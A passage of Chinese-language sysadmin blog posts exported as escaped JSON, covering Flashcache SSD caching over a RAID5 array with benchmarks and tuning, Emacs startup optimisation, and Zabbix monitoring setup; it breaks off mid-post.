\/data\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n\n<p>\n\/data\u76ee\u5f55\u4e0b\u7684\u6570\u636e\u8bfb\u5199\u5c31\u5df2\u7ecf\u5728\u4f7f\u7528Flashcache\u4e86\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u521b\u5efa\u7528\u6765\u6d4b\u8bd5\u7684\u6570\u636e\u6587\u4ef6\uff081G\uff09\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">dd <span style=\"color: #ffcc66;\">if<\/span>=\/dev\/urandom <span style=\"color: #ffcc66;\">of<\/span>=\/dev\/shm\/test.dat <span style=\"color: #ffcc66;\">bs<\/span>=1024k <span style=\"color: #ffcc66;\">count<\/span>=1024\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u6d4b\u7b97\u4f7f\u7528HDD\u5199\u8017\u65f6\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo sh -c <span style=\"color: #66cccc;\">'echo 1 &gt; \/proc\/sys\/vm\/drop_caches; time cp \/dev\/shm\/test.dat \/'<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u8f93\u51fa\uff1a\n<\/p>\n\n<pre class=\"example\">\nreal    0m4.751s\nuser    0m0.000s\nsys 0m0.600s\n<\/pre>\n<\/li>\n\n<li>\u6d4b\u7b97\u4f7f\u7528HDD\u8bfb\u8017\u65f6\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo sh -c <span style=\"color: #66cccc;\">'echo 1 &gt; \/proc\/sys\/vm\/drop_caches; time cp \/test.dat \/dev\/shm\/<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u8f93\u51fa\uff1a\n<\/p>\n\n<pre class=\"example\">\nreal    0m10.580s\nuser    0m0.010s\nsys 0m0.727s\n<\/pre>\n<\/li>\n\n<li>\u6d4b\u7b97\u4f7f\u7528Flashcache\u5199\u8017\u65f6\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo sh -c <span style=\"color: #66cccc;\">'echo 1 &gt; \/proc\/sys\/vm\/drop_caches; time cp \/dev\/shm\/test.dat \/data\/'<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u8f93\u51fa\uff1a\n<\/p>\n\n<pre class=\"example\">\nreal    0m7.363s\nuser    0m0.000s\nsys 0m0.760s\n<\/pre>\n<\/li>\n\n<li>\u6d4b\u7b97\u4f7f\u7528Flashcache\u8bfb\u8017\u65f6\n\n<p>\n\u7b2c\u4e00\u8f6e\u6d4b\u8bd5\uff08\u7f13\u5b58\u9884\u70ed\uff09\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo sh -c <span style=\"color: #66cccc;\">'echo 1 &gt; \/proc\/sys\/vm\/drop_caches; time cp \/data\/test.dat \/dev\/shm\/'<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u8f93\u51fa\uff1a\n<\/p>\n\n<pre class=\"example\">\nreal    0m9.557s\nuser    0m0.013s\nsys 0m1.157s\n<\/pre>\n\n<p>\n\u7b2c\u4e8c\u8f6e\u6d4b\u8bd5\uff08\u7f13\u5b58\u751f\u6548\uff09\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo sh -c <span style=\"color: #66cccc;\">'echo 1 &gt; \/proc\/sys\/vm\/drop_caches; time cp \/data\/test.dat \/dev\/shm\/'<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u8f93\u51fa\uff1a\n<\/p>\n\n<pre class=\"example\">\nreal    0m3.107s\nuser    0m0.000s\nsys 0m0.850s\n<\/pre>\n<\/li>\n\n<li>\u6e05\u9664\u6d4b\u8bd5\u6570\u636e\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo rm \/test.dat \/dev\/shm\/test.dat \/data\/test.dat\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u7ed3\u679c\u5206\u6790\n\n<ul class=\"org-ul\">\n<li>Flashcache\u8bfb\u6027\u80fd\uff1a <b>\u63d0\u534770%<\/b>\n<\/li>\n\n<li>Flashcache\u5199\u6027\u80fd\uff1a <b>\u964d\u4f4e55%<\/b>\n<\/li>\n<\/ul>\n<p>\n\u56e0\u4e3a\u4f7f\u7528\u4e86 <code>Write-Around<\/code> \u65b9\u5f0f\uff0c\u6240\u4ee5\u63d0\u5347\u4e86\u8bfb\u6027\u80fd\uff0c\u964d\u4f4e\u4e86\u5199\u6027\u80fd\u3002\n<\/p>\n<\/li>\n\n<li>\u6e05\u9664\u6a21\u62df\u73af\u5883\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo umount \/data\nsudo dmsetup remove cachedev\nsudo losetup -d \/dev\/loop1\nsudo rm \/dev\/shm\/ssd.img\nsudo losetup -d \/dev\/loop2\nsudo rm \/hdd.img\nsudo rmdir \/data\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n"
},
{
  "title": "FlashCache\u591a\u76d8\u65b9\u6848\u5b9e\u6218",
  "timestamp": "2015-04-29 17:38:00",
  "tags": [
    "linux",
    "flashcache",
    "RAID"
  ],
  "body": "<p>\n\u76ee\u6807\u7cfb\u7edf\u4e3a\u5355SSD+\u591aHDD\uff0c\u5c06\u591aHDD\u521b\u5efa\u4e3aRAID5\u903b\u8f91\u76d8\uff0c\u7136\u540e\u4f7f\u7528FlashCache\u5c06SSD\u505a\u4e3aRAID5\u903b\u8f91\u76d8\u7684\u7f13\u5b58\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u7cfb\u7edf\u4fe1\u606f<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>OS\n\n<p>\nCentOS release 6.5 (Final) x86_64\n<\/p>\n<\/li>\n\n<li>CPU\n\n<p>\n8\n<\/p>\n\n<p>\nIntel(R) Atom(TM) CPU  C2750  @ 2.40GHz\n<\/p>\n<\/li>\n\n<li>MEMORY\n\n<p>\n4\n<\/p>\n\n<p>\nTOTAL 16G\n<\/p>\n<\/li>\n\n<li>HDD\n\n<p>\n4\n<\/p>\n\n<p>\nWDC WD4000FYYZ-0 4TB 7200\u8f6c\n<\/p>\n\n<p>\n\/dev\/sdc \/dev\/sdd \/dev\/sde \/dev\/sdf\n<\/p>\n<\/li>\n\n<li>SSD\n\n<p>\n1\n<\/p>\n\n<p>\nINTEL SSDSC2BB30 300GB\n<\/p>\n\n<p>\n\/dev\/sdb\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u5378\u8f7dHDD\u53caSSD\u76d8<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">umount \/dev\/sdc \/dev\/sdd \/dev\/sde \/dev\/sdf \/dev\/sdb\n<\/pre>\n<\/div>\n\n<p>\n\u786e\u4fdd\u7cfb\u7edf\u91cd\u542f\u540e\u4e0d\u4f1a\u81ea\u52a8\u6302\u8f7d\u8fd9\u4e9b\u76d8\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u5c06\u591aHDD\u521b\u5efa\u4e3aRAID5\u903b\u8f91\u76d8<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li>\u683c\u5f0f\u5316HDD\u76d8\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">parted \/dev\/sdc\n(parted) mklabel gpt\n(parted) unit TB\n(parted) mkpart primary 0.00TB 4.00TB\n(parted) print\n<\/pre>\n<\/div>\n\n<p>\n\u5176\u5b83HDD\u76d8\u4e5f\u505a\u5982\u4e0a\u5904\u7406.\n<\/p>\n<\/li>\n\n<li>\u521b\u5efaRAID5\u903b\u8f91\u5206\u533a\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mdadm --create \/dev\/md0 --level=raid5 --raid-devices=4 \/dev\/sd[c-f]1\nparted \/dev\/md0\n(parted) mklabel gpt\n(parted) unit TB\n(parted) mkpart primary 0.00TB 12.00TB\n(parted) print\n(parted) quit\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u4fdd\u5b58RAID5\u914d\u7f6e\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mdadm --detail --scan &gt; \/etc\/mdadm.conf\n<\/pre>\n<\/div>\n\n<p>\n\u53c2\u8003\uff1a<a href=\"https:\/\/raid.wiki.kernel.org\/index.php\/RAID_setup#Saving_your_RAID_configuration\">Saving your RAID configuration<\/a>\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u5b89\u88c5Flashcache<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">wget https:\/\/github.com\/facebook\/flashcache\/archive\/stable_v3.1.3.zip -O flashca<span style=\"text-decoration: underline;\">che_stable_v3.1.3.zip<\/span>\nunzip flashcache_stable_v3.1.3.zip\n<span style=\"color: #cc99cc;\">cd<\/span> flashcache-stable_v3.1.3\nmake\nmake install\nmodprobe flashcache\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">\u521b\u5efaFlashcache\u6df7\u5408\u8bbe\u5907<\/h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">flashcache_create -p around cachedev \/dev\/sdb \/dev\/md0p1\nmkfs.ext4 \/dev\/mapper\/cachedev\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">\u6302\u8f7dFlashcache\u6df7\u5408\u8bbe\u5907<\/h2>\n<div class=\"outline-text-2\" id=\"text-6\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mkdir \/data\nmount \/dev\/mapper\/cachedev \/data\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-7\" class=\"outline-2\">\n<h2 id=\"sec-7\">\u7cfb\u7edf\u91cd\u542f\u540e\u9700\u8981\u91cd\u65b0\u521b\u5efa\u5e76\u6302\u8f7dFlashcache\u8bbe\u5907<\/h2>\n<div class=\"outline-text-2\" id=\"text-7\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">flashcache_create -p around cachedev \/dev\/sdb \/dev\/md0p1\nmount \/dev\/mapper\/cachedev \/data\n<\/pre>\n<\/div>\n\n<p>\n\u6ce8\u610f\uff1a\u4f7f\u7528\u9664 <code>writethrough<\/code> \u548c <code>writearound<\/code> \u4ee5\u5916\u7684\u6a21\u5f0f\u9700\u8981\u4f7f\u7528 <code>flashcache_load<\/code> \u91cd\u65b0\u521b\u5efa\u8bbe\u5907\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-8\" class=\"outline-2\">\n<h2 id=\"sec-8\">\u5199\u5165\u901f\u5ea6\u6d4b\u8bd5<\/h2>\n<div class=\"outline-text-2\" id=\"text-8\">\n<p>\n\u5faa\u73af\u521b\u5efa60MiB\u5927\u5c0f\u7684\u6587\u4ef6\uff0c\u6d4b\u5f97\u7684\u78c1\u76d8\u5199\u5165\u901f\u5ea6\u4e3a <b>35.6MiB<\/b> \uff0c\u78c1\u76d8\u8bfb\u53d6\u901f\u5ea6\u4e3a <b>2.1MiB<\/b> \u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-9\" class=\"outline-2\">\n<h2 id=\"sec-9\">\u8bfb\u53d6\u901f\u5ea6\u6d4b\u8bd5<\/h2>\n<div class=\"outline-text-2\" id=\"text-9\">\n<ul class=\"org-ul\">\n<li>500\u5e76\u53d1120G\u6587\u4ef6\u6bcf\u6b21\u8bfb\u53d632KB\u987a\u5e8f\u8bfb\u53d6\n\n<ul class=\"org-ul\">\n<li>\u8bf7\u6c42\u5904\u7406\u901f\u5ea6\n\n<p>\n2107\n<\/p>\n<\/li>\n\n<li>\u4f20\u8f93\u901f\u5ea6\n\n<p>\n132.35MiB\/s\n<\/p>\n<\/li>\n<\/ul>\n<\/li>\n\n<li>500\u5e76\u53d1500G\u6587\u4ef6\u6bcf\u6b21\u8bfb\u53d632KB\u987a\u5e8f\u8bfb\u53d6\n\n<ul class=\"org-ul\">\n<li>\u8bf7\u6c42\u5904\u7406\u901f\u5ea6\n\n<p>\n1937\n<\/p>\n<\/li>\n\n<li>\u4f20\u8f93\u901f\u5ea6\n\n<p>\n61.09MiB\n<\/p>\n<\/li>\n<\/ul>\n<\/li>\n\n<li>500\u5e76\u53d11T\u6587\u4ef6\u6bcf\u6b21\u8bfb\u53d632KB\u987a\u5e8f\u8bfb\u53d6\n\n<ul class=\"org-ul\">\n<li>\u8bf7\u6c42\u5904\u7406\u901f\u5ea6\n\n<p>\n1574\n<\/p>\n<\/li>\n\n<li>\u4f20\u8f93\u901f\u5ea6\n\n<p>\n49.64MiB\/s\n<\/p>\n<\/li>\n<\/ul>\n<\/li>\n\n<li>500\u5e76\u53d1120G\u6587\u4ef6\u6bcf\u6b21\u8bfb\u53d664KB\u987a\u5e8f\u8bfb\u53d6\n\n<ul class=\"org-ul\">\n<li>\u8bf7\u6c42\u5904\u7406\u901f\u5ea6\n\n<p>\n5006\n<\/p>\n<\/li>\n\n<li>\u4f20\u8f93\u901f\u5ea6\n\n<p>\n157.88MiB\/s\n<\/p>\n<\/li>\n<\/ul>\n<\/li>\n\n<li>500\u5e76\u53d1500G\u6587\u4ef6\u6bcf\u6b21\u8bfb\u53d664KB\u987a\u5e8f\u8bfb\u53d6\n\n<ul class=\"org-ul\">\n<li>\u8bf7\u6c42\u5904\u7406\u901f\u5ea6\n\n<p>\n897\n<\/p>\n<\/li>\n\n<li>\u4f20\u8f93\u901f\u5ea6\n\n<p>\n56.37MiB\/s\n<\/p>\n<\/li>\n<\/ul>\n<\/li>\n\n<li>500\u5e76\u53d11T\u6587\u4ef6\u6bcf\u6b21\u8bfb\u53d664KB\u987a\u5e8f\u8bfb\u53d6\n\n<ul class=\"org-ul\">\n<li>\u8bf7\u6c42\u5904\u7406\u901f\u5ea6\n\n<p>\n782\n<\/p>\n<\/li>\n\n<li>\u4f20\u8f93\u901f\u5ea6\n\n<p>\n49.10MiB\/s\n<\/p>\n<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-10\" class=\"outline-2\">\n<h2 id=\"sec-10\">\u6ce8\u610f\u4e8b\u9879<\/h2>\n<div class=\"outline-text-2\" id=\"text-10\">\n<ul class=\"org-ul\">\n<li>\u91cd\u5efa\uff08rebuild\uff09\n\n<p>\n\u5f53\u4e00\u5757\u76d8\u574f\u6389\u540e\uff0c\u5982\u679c\u914d\u7f6e\u4e86\u70ed\u5907\u76d8\uff08Hot spare disk\uff09\uff0c\u4f1a\u81ea\u52a8\u91cd\u5efa\uff0c\u8bf7\u5c06\u574f\u76d8\u6362\u6389\u5e76\u914d\u7f6e\u6210\u70ed\u5907\u76d8\uff1b\\\n\u5982\u679c\u672a\u914d\u7f6e\u70ed\u5907\u76d8\uff0c\u8bfb\u6027\u80fd\u4f1a\u4e0b\u964d\uff08\u574f\u76d8\u4e2d\u7684\u6570\u636e\u9700\u8981\u5168\u90e8\u901a\u8fc7\u8ba1\u7b97\u91cd\u73b0\uff09\uff0c\u8bf7\u5c06\u574f\u76d8\u6362\u6389\u7cfb\u7edf\u4f1a\u81ea\u52a8\u8fdb\u884c\u91cd\u5efa\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-11\" class=\"outline-2\">\n<h2 id=\"sec-11\">\u6f5c\u5728\u7684\u4f18\u5316\u9009\u9879<\/h2>\n<div class=\"outline-text-2\" id=\"text-11\">\n<ul class=\"org-ul\">\n<li>\u5f00\u542fSSD\u5199Cache\n<\/li>\n\n<li>\u7981\u7528\u6587\u4ef6\u3001\u76ee\u5f55\u8bbf\u95ee\u65f6\u95f4\u6233\n\n<p>\nnoatime,nodiratime\n<\/p>\n<\/li>\n\n<li><code>Write-Back<\/code> \u6a21\u5f0f\u4f18\u5316\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sysctl -w dev.flashcache.sdb+md0p1.dirty_thresh_pct=80\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n\n<div id=\"outline-container-sec-12\" class=\"outline-2\">\n<h2 id=\"sec-12\">\u5378\u8f7dFlashcache\u8bbe\u5907<\/h2>\n<div class=\"outline-text-2\" id=\"text-12\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">umount \/dev\/mapper\/cachedev\ndmsetup remove cachedev\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-13\" class=\"outline-2\">\n<h2 id=\"sec-13\">Q&amp;A<\/h2>\n<div class=\"outline-text-2\" id=\"text-13\">\n<ul class=\"org-ul\">\n<li>\u91cd\u65b0\u8c03\u6574 Flashcache \u9009\u9879\u4f1a\u4e0d\u4f1a\u5220\u9664\u6570\u636e\uff1f\n\n<p>\n<code>writethrough<\/code> \u3001 <code>writearound<\/code> \u6a21\u5f0f\u4e0d\u4f1a\uff0c\u5176\u5b83\u7684\u4f1a\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-14\" class=\"outline-2\">\n<h2 id=\"sec-14\">\u76f8\u5173\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-14\">\n<dl class=\"org-dl\">\n<dt> \u300a<a href=\"http:\/\/lzw.me\/a\/linux-lvm.html\">Linux LVM\u903b\u8f91\u5377\u7ba1\u7406\u8be6\u7ec6\u4ecb\u7ecd<\/a>\u300b <\/dt><dd>\u975e\u5e38\u597d\u7684LVM\u5165\u95e8\u6587\u7ae0\n<\/dd>\n\n<dt> \u300a<a href=\"http:\/\/www.linux-mag.com\/id\/7582\/\">Pick Your Pleasure: RAID-0 mdadm Striping or LVM Striping?<\/a>\u300b <\/dt><dd>LVM\u4e0eRAID-0\u7684\u6bd4\u8f83\n<\/dd>\n\n<dt> \u300a<a href=\"http:\/\/www.tecmint.com\/create-raid0-in-linux\/\">Creating Software RAID0 (Stripe) on \u2018Two Devices\u2019 Using \u2018mdadm\u2019 Tool in Linux \u2013 Part 2<\/a>\u300b <\/dt><dd>\u6784\u5efaRAID-0\u6559\u7a0b\n<\/dd>\n\n<dt> \u300a<a href=\"http:\/\/zengrong.net\/post\/2014.htm\">\u5728CentOS 6.1\u4e0a\u914d\u7f6e 4TB\u786c\u76d8+RAID1<\/a>\u300b <\/dt><dd>\u4f7f\u7528 <code>parted<\/code> \u4ee3\u66ff <code>fdisk<\/code> \u5bf9\u5927\u4e8e2TB\u7684\u786c\u76d8\u8fdb\u884c\u5206\u533a\n<\/dd>\n\n<dt> \u300a<a href=\"http:\/\/wiki.mikejung.biz\/Software_RAID\">Software RAID - How to Optimize Software RAID on Linux using Mdadm<\/a>\u300b <\/dt><dd>\u4f18\u5316RAID\n<\/dd>\n\n<dt> \u300a<a href=\"http:\/\/sysadmin.blog.51cto.com\/83876\/236802\">RAID5\u5355\u76d8\u6545\u969c\u8bfb\u5199\u5206\u6790<\/a>\u300b <\/dt><dd>RAID5\u4e00\u5757\u76d8\u574f\u6389\u540e\u7684\u60c5\u5f62\u5206\u6790\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n"
},
{
  "title": "Flashcache\u4f18\u5316",
  "timestamp": "2015-05-22 18:12:00",
  "tags": [
    "flashcache"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u8c03\u6574 dev.flashcache.&lt;cache name&gt;.dirty_thresh_pct\n\n<p>\n\u810f\u7f13\u5b58\u56de\u5199\u9608\u503c\uff08\u767e\u5206\u6bd4\uff09\uff0c\u9ed8\u8ba4 <code>20<\/code> \u3002\n<\/p>\n\n<p>\n\u4ec5 <code>Write-Back<\/code> \u6a21\u5f0f\u4e0b\u6709\u6548\u3002\n<\/p>\n\n<p>\n\u8c03\u5927\u8be5\u503c\u53ef\u4ee5\u51cf\u8f7b\u5199\u538b\u529b\uff08\u7f13\u5b58\u6570\u636e\u5199\u5165HDD\u53ca\u5143\u6570\u636e\u5199\u5165SSD\uff09\uff0c\u7f13\u5b58\u5df2\u6ee1\u65f6\u8be5\u7f13\u5b58\u5757\u4e0d\u80fd\u88ab\u6dd8\u6c70\uff0c\u51cf\u5c11\u4e86\u53ef\u7528\u7f13\u5b58\u7a7a\u95f4\u3002\n<\/p>\n\n<p>\n\u5982\u679c\u6700\u8fd1\u5199\u5165\u7684\u6570\u636e\u5f88\u53ef\u80fd\u662f\u70ed\u6570\u636e\uff0c\u53ef\u4ee5\u8003\u8651\u8c03\u5927\u8be5\u503c\uff0c\u5efa\u8bae\u8c03\u5230 <code>90<\/code> \uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sysctl -w dev.flashcache.&lt;cache name&gt;.dirty_thresh_pct=90\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u8c03\u6574 dev.flashcache.reclaim_policy\n\n<p>\n\u7f13\u5b58\u7a7a\u95f4\u56de\u6536\u7b56\u7565\uff0c\u9ed8\u8ba4 <code>FIFO(0)<\/code> \u3002\n<\/p>\n\n<p>\n\u6539\u4e3a <code>LRU(1)<\/code> :\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sysctl -w dev.flashcache.&lt;cache name&gt;.reclaim_policy=1\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u8f85\u52a9\u8c03\u8bd5\n\n<ul class=\"org-ul\">\n<li>\u7edf\u8ba1\u6e05\u96f6\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sysctl -w dev.flashcache.&lt;cache name&gt;.zero_stats=1\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5feb\u901f\u505c\u6b62\n\n<p>\nFlashcache\u5728\u505c\u6b62\u65f6\u4f1a\u5c06SSD\u4e2d\u7684\u810f\u6570\u636e\u5199\u56de\u5230HDD\u4e2d\uff0c\u8fd9\u662f\u975e\u5e38\u8017\u65f6\u7684\uff0c\u4f1a\u5bfc\u81f4\u5173\u673a\u6162\u3002\n<\/p>\n\n<p>\n\u624b\u5de5\u5feb\u901f\u505c\u6b62\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">service flashcache forcestop\n<\/pre>\n<\/div>\n\n<p>\n\u603b\u662f\u5feb\u901f\u505c\u6b62\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sysctl -w dev.flashcache.sdb+sdc1.fast_remove=1\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n"
},
{
  "title": "emacs\u542f\u52a8\u901f\u5ea6\u4f18\u5316",
  "timestamp": "2015-05-24 11:17:00",
  "tags": [
    "emacs"
  ],
  "body": "<p>\nemacs\u88c5\u4e86\u5f88\u591a\u63d2\u4ef6\u540e\uff0c\u542f\u52a8\u8d8a\u6765\u8d8a\u6162\u4e86\uff0c\u6700\u8fd1\u53d1\u73b0\u542f\u52a8\u4e00\u6b21\u898125\u79d2\uff0c\u8d76\u5f97\u4e0a\u64cd\u4f5c\u7cfb\u7edf\u542f\u52a8\u65f6\u95f4\u4e86\uff0c\u662f\u65f6\u5019\u4f18\u5316\u4e00\u4e0b\u542f\u52a8\u901f\u5ea6\u4e86\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u88f8\u542f\u52a8emacs\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">emacs --quick\n<\/pre>\n<\/div>\n\n<p>\n\u5c3d\u7136\u8017\u65f610\u79d2\uff0c\u7f51\u4e0a\u67e5\u4e86\u4e00\u4e0b\u8fd9\u4e2a\u95ee\u9898\u5e38\u89c1\u4e8e <code>archlinux<\/code> \uff0c\u662f\u7f51\u7edc\u914d\u7f6e\u5f15\u8d77: <a href=\"https:\/\/wiki.archlinux.org\/index.php\/Emacs#Incorrect_network_configuration\">Emacs - Slow startup - Incorrect network configuration<\/a>\n<\/p>\n\n<p>\n\u89e3\u51b3\u65b9\u6848\u5c31\u662f\u5c06\u4e3b\u673a\u540d\uff08 <code>hostname<\/code> \u547d\u4ee4\u8f93\u51fa\uff09\u52a0\u5230 <code>\/etc\/hosts<\/code> \u4e2d\uff1a\n<\/p>\n\n<pre class=\"example\">\n127.0.0.1   localhost.localdomain   localhost &lt;hostame&gt;\n::1     localhost.localdomain   localhost  &lt;hostname&gt;\n<\/pre>\n\n<p>\n\u518d\u8bd5\uff0cemacs\u77ac\u95f4\u542f\u52a8\u3002\n<\/p>\n<\/li>\n\n<li>\u4e0d\u52a0\u8f7d\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\u542f\u52a8emacs\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">emacs --no-init-file\n<\/pre>\n<\/div>\n\n<p>\nemacs\u77ac\u95f4\u542f\u52a8\u3002\n<\/p>\n<\/li>\n\n<li>\u4e0d\u52a0\u8f7d\u6700\u8fd1\u4fdd\u5b58\u7684\u684c\u9762\u542f\u52a8emacs\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">emacs --no-desktop\n<\/pre>\n<\/div>\n\n<p>\n\u8017\u65f615\u79d2\uff0c\u770b\u6765\u662f\u4e2a\u4eba\u914d\u7f6e\u7684\u95ee\u9898\u4e86\n<\/p>\n<\/li>\n\n<li>\u4ece\u524d\u9762\u5f00\u59cb\u4e00\u5757\u4e00\u5757\u53cd\u6ce8\u91caemacs\u914d\u7f6e\uff0c\u770b\u662f\u5361\u5728\u54ea\u91cc\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-lisp\">(<span style=\"color: #99cc99;\">require<\/span> '<span style=\"color: #6699cc;\">anything-config<\/span>)\n<\/pre>\n<\/div>\n\n<p>\n\u8fd9\u4e00\u53e5\u8017\u65f611\u79d2\uff0c\u6ce8\u91ca\u6389\uff0c\u73b0\u5728\u542f\u65f6\u65f6\u95f4\u4e3a5\u79d2\uff0c\u53ef\u4ee5\u63a5\u53d7\u4e86\u3002<\/p>\n<\/li>\n<\/ul>\n"
},
{
  "title": "Zabbix\u6dfb\u52a0Flashcache\u76d1\u63a7",
  "timestamp": "2015-05-29 16:27:00",
  "tags": [
    "flashcache",
    "zabbix"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u4e0b\u8f7d <code>Zabbix<\/code> \u7684 <code>Flashcache<\/code> \u5f00\u6e90\u6a21\u677f<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git clone https:\/\/github.com\/lesovsky\/zabbix-extensions.git\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u8bbe\u7f6e <code>zabbix_agentd<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\"># <\/span><span style=\"color: #999999; font-style: italic;\">&#23433;&#35013;&#37197;&#32622;&#25991;&#20214;<\/span>\ncp zabbix-extensions\/files\/flashcache\/flashcache.conf \/usr\/local\/etc\/zabbix_agen<span style=\"text-decoration: underline;\">td.conf.d\/<\/span>\n<span style=\"color: #999999; font-style: italic;\"># <\/span><span style=\"color: #999999; font-style: italic;\">&#23433;&#35013;&#33050;&#26412;<\/span>\nmkdir \/usr\/local\/etc\/zabbix_scripts\ncp zabbix-extensions\/files\/flashcache\/scripts\/* \/usr\/local\/etc\/zabbix_scripts\/\n<span style=\"color: #999999; font-style: italic;\"># <\/span><span style=\"color: #999999; font-style: italic;\">&#20462;&#25913;&#37197;&#32622;&#25991;&#20214;&#20013;&#24341;&#29992;&#30340;&#33050;&#26412;&#36335;&#24452;<\/span>\nsed --in-place -e <span style=\"color: #66cccc;\">'s\/\\\/usr\\\/libexec\\\/zabbix-extensions\\\/\/\\\/usr\\\/local\\\/etc\\\/zabb<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ix_\/g'<\/span><span style=\"text-decoration: underline;\"> \/usr\/local\/etc\/zabbix_agentd.conf.d\/flashcache.conf<\/span>\n<span style=\"color: #999999; font-style: italic;\"># <\/span><span style=\"color: #999999; font-style: italic;\">&#21253;&#21547;&#37197;&#32622;&#25991;&#20214;&#30446;&#24405;<\/span>\nsed --in-place -e <span style=\"color: #66cccc;\">'s\/# Include=\\\/usr\\\/local\\\/etc\\\/zabbix_agentd\\.conf\\.d\\\/\/Inclu<\/span><span style=\"color: #66cccc; text-decoration: underline;\">de=\\\/usr\\\/local\\\/etc\\\/zabbix_agentd\\.conf\\.d\\\/\/g'<\/span><span style=\"text-decoration: underline;\"> \/usr\/local\/etc\/zabbix_agentd.conf<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u91cd\u542f <code>zabbix_agentd<\/code> \u751f\u6548\u914d\u7f6e\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 